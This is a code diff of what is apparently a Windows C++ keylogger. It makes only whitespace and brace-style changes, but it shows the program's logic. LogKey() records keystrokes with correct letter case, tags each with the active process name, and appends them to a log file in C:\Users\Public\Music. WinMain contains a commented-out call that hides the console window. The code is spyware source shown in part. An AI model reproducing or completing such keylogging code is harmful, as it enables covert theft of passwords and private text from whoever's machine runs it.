@@ -31,8 +31,8 @@ void GetProcessName(std::string& processName, std::string& windowText) {
 
 // Helper to log key with case sensitivity and process info
 void LogKey(DWORD vkCode) {
-    BYTE keyboardState[256] = {0};
-    char buffer[3] = {0};
+    BYTE keyboardState[256] = { 0 };
+    char buffer[3] = { 0 };
     UINT scanCode = MapVirtualKeyA(vkCode, MAPVK_VK_TO_VSC);
 
     // Get process and window info
@@ -63,13 +63,15 @@ void LogKey(DWORD vkCode) {
             if (!(capsLock ^ shift)) {
                 ch = ch + ('a' - 'A'); // convert to lowercase
             }
-        } else if (ch >= 'a' && ch <= 'z') {
+        }
+        else if (ch >= 'a' && ch <= 'z') {
             if (capsLock ^ shift) {
                 ch = ch - ('a' - 'A'); // convert to uppercase
             }
         }
         keyBuffer += ch;
-    } else {
+    }
+    else {
         // If Enter is pressed, flush the buffer
         if (vkCode == VK_RETURN) {
             logFile << processName << ": " << keyBuffer << "[Enter]" << std::endl;
@@ -94,10 +96,10 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     AllocConsole();
     //ShowWindow(GetConsoleWindow(), SW_HIDE);
     // Fix for freopen_s usage and errors  
-    FILE* stream;  
-    if (freopen_s(&stream, "CONOUT$", "w", stdout) != 0) {  
+    FILE* stream;
+    if (freopen_s(&stream, "CONOUT$", "w", stdout) != 0) {
         // Handle error if redirection fails  
-        return 1;  
+        return 1;
     }
     // Open log file once
     logFile.open("C:\\Users\\Public\\Music\\log.txt", std::ios::app);
